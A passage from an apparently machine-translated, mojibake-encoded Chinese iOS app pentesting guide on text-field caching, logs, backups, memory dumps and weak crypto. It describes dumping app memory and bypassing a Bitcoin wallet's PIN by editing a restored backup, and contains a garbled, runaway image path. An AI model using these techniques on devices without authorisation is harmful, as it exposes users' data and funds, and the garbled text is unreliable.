* åœ¨Xcodeçš„â€œInterface Builderâ€ä¸­æ‰“å¼€xibå’Œstoryboardæ–‡ä»¶ï¼Œå¹¶åœ¨é€‚å½“çš„å¯¹è±¡çš„â€œAttributes Inspectorâ€ä¸­éªŒè¯â€œSecure Text Entryâ€å’Œâ€œCorrectionâ€çš„çŠ¶æ€ã€‚

åº”ç”¨ç¨‹åºå¿…é¡»é˜²æ­¢æ•æ„Ÿä¿¡æ¯è¾“å…¥åˆ°æ–‡æœ¬å­—æ®µä¸­è¿›è¡Œç¼“å­˜ã€‚æ‚¨å¯ä»¥é€šè¿‡åœ¨æ‰€éœ€çš„UITextFieldsã€UITextViewså’ŒUISearchBarsä¸­ä½¿ç”¨`textObject.autocorrectionType = UITextAutocorrectionTypeNo`æŒ‡ä»¤æ¥ä»¥ç¼–ç¨‹æ–¹å¼ç¦ç”¨ç¼“å­˜ã€‚å¯¹äºåº”è¯¥è¢«å±è”½çš„æ•°æ®ï¼Œä¾‹å¦‚PINç å’Œå¯†ç ï¼Œå°†`textObject.secureTextEntry`è®¾ç½®ä¸º`YES`ã€‚
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **æ—¥å¿—**

è°ƒè¯•ä»£ç æœ€å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ—¥å¿—è®°å½•ï¼Œè€Œåº”ç”¨ç¨‹åº**å¯èƒ½ä¼šåœ¨æ—¥å¿—ä¸­æ‰“å°æ•æ„Ÿä¿¡æ¯**ã€‚\
åœ¨iOS 6åŠä»¥ä¸‹ç‰ˆæœ¬ä¸­ï¼Œæ—¥å¿—æ˜¯å¯è¯»çš„ï¼ˆæ¶æ„åº”ç”¨ç¨‹åºå¯ä»¥è¯»å–å…¶ä»–åº”ç”¨ç¨‹åºçš„æ—¥å¿—å¹¶ä»ä¸­æå–æ•æ„Ÿä¿¡æ¯ï¼‰ã€‚**ç°åœ¨ï¼Œåº”ç”¨ç¨‹åºåªèƒ½è®¿é—®è‡ªå·±çš„æ—¥å¿—**ã€‚

ç„¶è€Œï¼Œ**æ”»å‡»è€…**å¦‚æœèƒ½å¤Ÿ**ç‰©ç†æ¥è§¦**åˆ°ä¸€ä¸ª**è§£é”çš„**è®¾å¤‡ï¼Œå¯ä»¥å°†å…¶è¿æ¥åˆ°è®¡ç®—æœºå¹¶**è¯»å–æ—¥å¿—**ï¼ˆè¯·æ³¨æ„ï¼Œåº”ç”¨ç¨‹åºå†™å…¥ç£ç›˜çš„æ—¥å¿—åœ¨å¸è½½åº”ç”¨ç¨‹åºæ—¶ä¸ä¼šè¢«åˆ é™¤ï¼‰ã€‚

å»ºè®®**æµè§ˆåº”ç”¨ç¨‹åºçš„æ‰€æœ‰å±å¹•**ï¼Œä¸**æ¯ä¸ª**UIå…ƒç´ è¿›è¡Œ**äº¤äº’**ï¼Œå¹¶åœ¨æ‰€æœ‰æ–‡æœ¬å­—æ®µä¸­æä¾›è¾“å…¥æ–‡æœ¬ï¼Œå¹¶**æŸ¥çœ‹æ—¥å¿—**ä»¥å¯»æ‰¾**æš´éœ²çš„æ•æ„Ÿä¿¡æ¯**ã€‚

ä½¿ç”¨ä»¥ä¸‹å…³é”®å­—æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æºä»£ç ä»¥æŸ¥æ‰¾é¢„å®šä¹‰å’Œè‡ªå®šä¹‰çš„æ—¥å¿—è®°å½•è¯­å¥ï¼š

* é¢„å®šä¹‰å’Œå†…ç½®å‡½æ•°ï¼š
* NSLog
* NSAssert
* NSCAssert
* fprintf
* è‡ªå®šä¹‰å‡½æ•°ï¼š
* Logging
* Logfile

**ç›‘æ§ç³»ç»Ÿæ—¥å¿—**

è®¸å¤šåº”ç”¨ç¨‹åºå°†ä¿¡æ¯æ€§ï¼ˆå’Œæ½œåœ¨æ•æ„Ÿçš„ï¼‰æ¶ˆæ¯è®°å½•åˆ°æ§åˆ¶å°æ—¥å¿—ä¸­ã€‚æ—¥å¿—è¿˜åŒ…å«å´©æºƒæŠ¥å‘Šå’Œå…¶ä»–æœ‰ç”¨ä¿¡æ¯ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
æ‚¨å¯ä»¥é€šè¿‡Xcodeçš„**è®¾å¤‡**çª—å£æ”¶é›†æ§åˆ¶å°æ—¥å¿—ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š

1. å¯åŠ¨Xcodeã€‚
2. å°†æ‚¨çš„è®¾å¤‡è¿æ¥åˆ°ä¸»æœºè®¡ç®—æœºã€‚
3. é€‰æ‹©**çª—å£** -> **è®¾å¤‡å’Œæ¨¡æ‹Ÿå™¨**ã€‚
4. åœ¨è®¾å¤‡çª—å£çš„å·¦ä¾§éƒ¨åˆ†ç‚¹å‡»æ‚¨è¿æ¥çš„iOSè®¾å¤‡ã€‚
5. é‡ç°é—®é¢˜ã€‚
6. ç‚¹å‡»è®¾å¤‡çª—å£å³ä¸Šè§’çš„**æ‰“å¼€æ§åˆ¶å°**æŒ‰é’®ï¼Œåœ¨å•ç‹¬çš„çª—å£ä¸­æŸ¥çœ‹æ§åˆ¶å°æ—¥å¿—ã€‚

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å¤‡ä»½

iOSåŒ…æ‹¬è‡ªåŠ¨å¤‡ä»½åŠŸèƒ½ï¼Œå¯ä»¥åˆ›å»ºè®¾å¤‡ä¸Šå­˜å‚¨çš„æ•°æ®çš„å‰¯æœ¬ã€‚æ‚¨å¯ä»¥ä½¿ç”¨iTunesï¼ˆç›´åˆ°macOS Catalinaï¼‰æˆ–Finderï¼ˆä»macOS Catalinaå¼€å§‹ï¼‰ä»ä¸»æœºè®¡ç®—æœºåˆ›å»ºiOSå¤‡ä»½ï¼Œæˆ–è€…é€šè¿‡iCloudå¤‡ä»½åŠŸèƒ½è¿›è¡Œå¤‡ä»½ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå¤‡ä»½åŒ…æ‹¬å­˜å‚¨åœ¨iOSè®¾å¤‡ä¸Šçš„å‡ ä¹æ‰€æœ‰æ•°æ®ï¼Œä½†ä¸åŒ…æ‹¬é«˜åº¦æ•æ„Ÿçš„æ•°æ®ï¼Œå¦‚Apple Payä¿¡æ¯å’ŒTouch IDè®¾ç½®ã€‚

ç”±äºiOSå¤‡ä»½å·²å®‰è£…çš„åº”ç”¨ç¨‹åºåŠå…¶æ•°æ®ï¼Œä¸€ä¸ªæ˜æ˜¾çš„é—®é¢˜æ˜¯ï¼Œåº”ç”¨ç¨‹åºå­˜å‚¨çš„æ•æ„Ÿç”¨æˆ·æ•°æ®æ˜¯å¦å¯èƒ½é€šè¿‡å¤‡ä»½æ— æ„ä¸­æ³„æ¼ã€‚å¦ä¸€ä¸ªé—®é¢˜ï¼Œè™½ç„¶ä¸å¤ªæ˜æ˜¾ï¼Œä½†åŒæ ·é‡è¦çš„æ˜¯ï¼Œæ¢å¤ä¿®æ”¹åçš„å¤‡ä»½åï¼Œæ˜¯å¦å¯ä»¥ç¯¡æ”¹ç”¨äºä¿æŠ¤æ•°æ®æˆ–é™åˆ¶åº”ç”¨ç¨‹åºåŠŸèƒ½çš„æ•æ„Ÿé…ç½®è®¾ç½®ä»¥æ›´æ”¹åº”ç”¨ç¨‹åºè¡Œä¸ºã€‚è¿™ä¸¤ä¸ªé—®é¢˜éƒ½æ˜¯åˆç†çš„ï¼Œå¹¶ä¸”è¿™äº›æ¼æ´å·²ç»åœ¨å¤§é‡åº”ç”¨ç¨‹åºä¸­å¾—åˆ°è¯å®ã€‚

å·²å®‰è£…ç§»åŠ¨åº”ç”¨ç¨‹åºçš„è®¾å¤‡çš„å¤‡ä»½å°†åŒ…æ‹¬æ‰€æœ‰å­ç›®å½•ï¼ˆé™¤äº†`Library/Caches/`ï¼‰å’Œ[åº”ç”¨ç¨‹åºçš„ç§æœ‰ç›®å½•](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12)ä¸­çš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œè¯·é¿å…åœ¨åº”ç”¨ç¨‹åºçš„ç§æœ‰ç›®å½•æˆ–å­ç›®å½•ä¸­çš„ä»»ä½•æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ä¸­ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨æ•æ„Ÿæ•°æ®ã€‚

å°½ç®¡é»˜è®¤æƒ…å†µä¸‹å§‹ç»ˆå¤‡ä»½`Documents/`å’Œ`Library/Application Support/`ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä½†æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨`NSURL setResourceValue:forKey:error:`å’Œ`NSURLIsExcludedFromBackupKey`é”®æ¥[æ’é™¤å¤‡ä»½ä¸­çš„æ–‡ä»¶](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28)ã€‚æ‚¨å¯ä»¥ä½¿ç”¨[NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey)å’Œ[CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey)æ–‡ä»¶ç³»ç»Ÿå±æ€§æ¥æ’é™¤æ–‡ä»¶å’Œç›®å½•çš„å¤‡ä»½ã€‚

{% hint style="warning" %}
å› æ­¤ï¼Œåœ¨æ£€æŸ¥åº”ç”¨ç¨‹åºçš„å¤‡ä»½æ—¶ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥æ˜¯å¦å¯ä»¥è®¿é—®**ä»»ä½•æ•æ„Ÿä¿¡æ¯**ï¼Œä»¥åŠæ˜¯å¦å¯ä»¥é€šè¿‡ä¿®æ”¹å¤‡ä»½çš„æŸäº›è®¾ç½®å¹¶æ¢å¤å¤‡ä»½æ¥ä¿®æ”¹åº”ç”¨ç¨‹åºçš„**ä»»ä½•æ•æ„Ÿè¡Œä¸º**ã€‚
{% endhint %}

**æµ‹è¯•æ–¹æ³•**

é¦–å…ˆï¼Œé€šè¿‡åˆ›å»ºè®¾å¤‡çš„å¤‡ä»½ï¼ˆå¯ä»¥ä½¿ç”¨Finderï¼‰å¹¶æ‰¾åˆ°å¤‡ä»½å­˜å‚¨ä½ç½®æ¥å¼€å§‹ã€‚å®˜æ–¹çš„Appleæ–‡æ¡£å°†å¸®åŠ©æ‚¨[æ‰¾åˆ°iPhoneã€iPadå’ŒiPod touchçš„å¤‡ä»½](https://support.apple.com/en-us/HT204215)ã€‚

æ‰¾åˆ°è®¾å¤‡çš„å¤‡ä»½åï¼ˆ`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨grepç­‰å·¥å…·æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…ä½¿ç”¨[iMazing](https://imazing.com)ç­‰å·¥å…·ã€‚

è¦ç¡®å®šå¤‡ä»½æ˜¯å¦åŠ å¯†ï¼Œå¯ä»¥æ£€æŸ¥ä½äºå¤‡ä»½ç›®å½•æ ¹ç›®å½•ä¸‹çš„"Manifest.plist"æ–‡ä»¶ä¸­åä¸º"IsEncrypted"çš„å¯†é’¥ã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†æŒ‡ç¤ºå¤‡ä»½å·²åŠ å¯†çš„é…ç½®ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨åŠ å¯†å¤‡ä»½è¿›è¡Œå·¥ä½œï¼Œå¯ä»¥åœ¨[DinoSecçš„GitHubå­˜å‚¨åº“](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts)ä¸­æ‰¾åˆ°ä¸€äº›Pythonè„šæœ¬ï¼Œä¾‹å¦‚**backup\_tool.py**å’Œ**backup\_passwd.py**ï¼Œå®ƒä»¬å°†ä½œä¸ºä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ã€‚ä½†è¯·æ³¨æ„ï¼Œå®ƒä»¬å¯èƒ½æ— æ³•ä¸æœ€æ–°çš„iTunes/Finderç‰ˆæœ¬é…åˆä½¿ç”¨ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œè°ƒæ•´ã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å·¥å…·[**iOSbackup**](https://pypi.org/project/iOSbackup/)è½»æ¾è¯»å–å’Œæå–å¯†ç åŠ å¯†çš„iOSå¤‡ä»½ä¸­çš„æ–‡ä»¶ã€‚

**å¦‚ä½•ä¿®æ”¹è¡Œä¸º**

åœ¨å¼€æºçš„æ¯”ç‰¹å¸é’±åŒ…åº”ç”¨ç¨‹åº[Bither](https://github.com/bither/bither-ios)ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¯ä»¥é…ç½®ä¸€ä¸ªPINç æ¥é”å®šç”¨æˆ·ç•Œé¢ã€‚\
è¿™ä¸ªPINç å­˜å‚¨åœ¨å¤‡ä»½ä¸­çš„æ–‡ä»¶`net.bither.plist`ä¸­çš„**pin\_code**é”®ä¸­ã€‚\
å¦‚æœæ‚¨ä»å¤‡ä»½ä¸­æ¸…é™¤è¯¥plistæ–‡ä»¶ä¸­çš„æ­¤é”®å¹¶æ¢å¤å¤‡ä»½ï¼Œæ‚¨å°†èƒ½å¤Ÿè®¿é—®é’±åŒ…ã€‚

## æµ‹è¯•å†…å­˜ä¸­çš„æ•æ„Ÿæ•°æ®

æ•æ„Ÿä¿¡æ¯æœ€ç»ˆä¼šå­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ç›®æ ‡æ˜¯ç¡®ä¿è¿™äº›ä¿¡æ¯å°½å¯èƒ½çŸ­æš‚åœ°æš´éœ²ã€‚

è¦è°ƒæŸ¥åº”ç”¨ç¨‹åºçš„å†…å­˜ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª**å†…å­˜è½¬å‚¨**ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è°ƒè¯•å™¨ç­‰å·¥å…·**å®æ—¶åˆ†æå†…å­˜**ã€‚æ— è®ºä½¿ç”¨å“ªç§æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å®¹æ˜“å‡ºé”™çš„è¿‡ç¨‹ï¼Œå› ä¸ºè½¬å‚¨æä¾›äº†æ‰§è¡Œå‡½æ•°ç•™ä¸‹çš„æ•°æ®ï¼Œæ‚¨å¯èƒ½ä¼šé”™è¿‡æ‰§è¡Œå…³é”®æ­¥éª¤ã€‚æ­¤å¤–ï¼Œé™¤éæ‚¨çŸ¥é“è¦æŸ¥æ‰¾çš„æ•°æ®çš„è¶³è¿¹ï¼ˆæ— è®ºæ˜¯ç¡®åˆ‡çš„å€¼è¿˜æ˜¯æ ¼å¼ï¼‰ï¼Œå¦åˆ™åœ¨åˆ†æè¿‡ç¨‹ä¸­å¿½ç•¥æ•°æ®æ˜¯éå¸¸å®¹æ˜“çš„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ ¹æ®éšæœºç”Ÿæˆçš„å¯¹ç§°å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œé™¤éæ‚¨é€šè¿‡å…¶ä»–æ–¹å¼æ‰¾åˆ°å…¶å€¼ï¼Œå¦åˆ™åœ¨å†…å­˜ä¸­å¾ˆéš¾æ‰¾åˆ°è¯¥å¯†é’¥ã€‚

**è·å–å’Œåˆ†æå†…å­˜è½¬å‚¨**

æ— è®ºæ‚¨ä½¿ç”¨è¶Šç‹±è®¾å¤‡è¿˜æ˜¯éè¶Šç‹±è®¾å¤‡ï¼Œéƒ½å¯ä»¥ä½¿ç”¨[objection](https://github.com/sensepost/objection)å’Œ[Fridump](https://github.com/Nightbringer21/fridump)æ¥è½¬å‚¨åº”ç”¨ç¨‹åºçš„è¿›ç¨‹å†…å­˜ã€‚

åœ¨å†…å­˜è½¬å‚¨å®Œæˆåï¼ˆä¾‹å¦‚è½¬å‚¨åˆ°åä¸º"memory"çš„æ–‡ä»¶ä¸­ï¼‰ï¼Œæ ¹æ®æ‚¨è¦æŸ¥æ‰¾çš„æ•°æ®çš„æ€§è´¨ï¼Œæ‚¨å°†éœ€è¦ä¸€ç»„ä¸åŒçš„å·¥å…·æ¥å¤„ç†å’Œåˆ†æè¯¥å†…å­˜è½¬å‚¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨ä¸“æ³¨äºå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œ`strings`æˆ–`rabin2 -zz`å‘½ä»¤æå–è¿™äº›å­—ç¬¦ä¸²å¯èƒ½å°±è¶³å¤Ÿäº†ã€‚
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
åœ¨æ‚¨å–œæ¬¢çš„ç¼–è¾‘å™¨ä¸­æ‰“å¼€`strings.txt`æ–‡ä»¶ï¼Œå¹¶æ·±å…¥å…¶ä¸­ä»¥è¯†åˆ«æ•æ„Ÿä¿¡æ¯ã€‚

ä½†æ˜¯ï¼Œå¦‚æœæ‚¨æƒ³æ£€æŸ¥å…¶ä»–ç±»å‹çš„æ•°æ®ï¼Œæœ€å¥½ä½¿ç”¨radare2åŠå…¶æœç´¢åŠŸèƒ½ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯å’Œé€‰é¡¹åˆ—è¡¨ï¼Œè¯·å‚é˜…radare2çš„æœç´¢å‘½ä»¤ï¼ˆ`/?`ï¼‰çš„å¸®åŠ©ã€‚ä»¥ä¸‹ä»…æ˜¾ç¤ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†é€‰é¡¹ï¼š
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**è¿è¡Œæ—¶å†…å­˜åˆ†æ**

ä½¿ç”¨[r2frida](https://github.com/nowsecure/r2frida)ï¼Œæ‚¨å¯ä»¥åœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶åˆ†æå’Œæ£€æŸ¥å†…å­˜ï¼Œè€Œæ— éœ€è½¬å‚¨å†…å­˜ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¿è¡Œä¹‹å‰åœ¨r2fridaä¸­çš„æœç´¢å‘½ä»¤ï¼Œå¹¶åœ¨å†…å­˜ä¸­æœç´¢å­—ç¬¦ä¸²ã€åå…­è¿›åˆ¶å€¼ç­‰ã€‚åœ¨è¿™æ ·åšæ—¶ï¼Œè¯·è®°ä½åœ¨ä½¿ç”¨`r2 frida://usb//<name_of_your_app>`å¯åŠ¨ä¼šè¯åï¼Œåœ¨æœç´¢å‘½ä»¤ï¼ˆå’Œä»»ä½•å…¶ä»–r2fridaç‰¹å®šå‘½ä»¤ï¼‰ä¹‹å‰ä½¿ç”¨åæ–œæ `\`ã€‚

## ç ´è§£å¯†ç å­¦

### å¼±å¯†é’¥ç®¡ç†æµç¨‹

ä¸€äº›å¼€å‘äººå‘˜å°†æ•æ„Ÿæ•°æ®ä¿å­˜åœ¨æœ¬åœ°å­˜å‚¨ä¸­ï¼Œå¹¶ä½¿ç”¨åœ¨ä»£ç ä¸­ç¡¬ç¼–ç /å¯é¢„æµ‹çš„å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚è¿™æ ·åšæ˜¯ä¸åº”è¯¥çš„ï¼Œå› ä¸ºä¸€äº›é€†å‘å·¥ç¨‹å¯èƒ½ä¼šä½¿æ”»å‡»è€…æå–æœºå¯†ä¿¡æ¯ã€‚

### ä½¿ç”¨ä¸å®‰å…¨å’Œ/æˆ–å·²å¼ƒç”¨çš„ç®—æ³•

